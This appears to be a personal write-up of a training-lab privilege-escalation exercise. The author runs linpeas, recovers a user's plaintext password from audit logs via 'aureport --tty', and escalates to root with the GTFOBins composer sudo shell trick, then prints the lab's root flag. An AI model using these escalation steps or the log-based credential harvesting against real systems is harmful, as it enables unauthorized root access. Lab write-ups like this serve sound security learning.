Will run the linpeas in the cry0l1t3 user
We just copy the linpeas.sh in the academy so that we can made a python server and host the file so that we could simply run it.

![[Pasted image 20230810084335.png]]

we had run the linpeas and got to know about cron jobs
and when we cat the audit.log file in the var/log/audit we confirmed the thing
![[Pasted image 20230810085416.png]]
exe="/usr/sbin/cron" 

command: aureport 
will give us the summary of the files in the folder
![[Pasted image 20230810085853.png]]

Command: aureport --tty
![[Pasted image 20230810090002.png]]

`NOTE - using built-in logs: /var/log/audit/audit.log
`1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
`2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
`3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
`4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
`5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>

User : mrb3n
`Password: mrb3n_Ac@d3my!

![[Pasted image 20230810090901.png]]

When i run sudo and pass the same credentials i got the same sudo user but we have to what composer is from the gitbins and run it as a sudo 

![[Pasted image 20230810091614.png]]

From the url https://gtfobins.github.io/gtfobins/composer/ we got this
## Sudo[](https://gtfobins.github.io/gtfobins/composer/#sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.


    TF=$(mktemp -d)
    echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
    sudo composer --working-dir=$TF run-script x
    
![[Pasted image 20230810092458.png]]

# cat root.txt
e6b0e61683c9ed694348a53de6ae9177
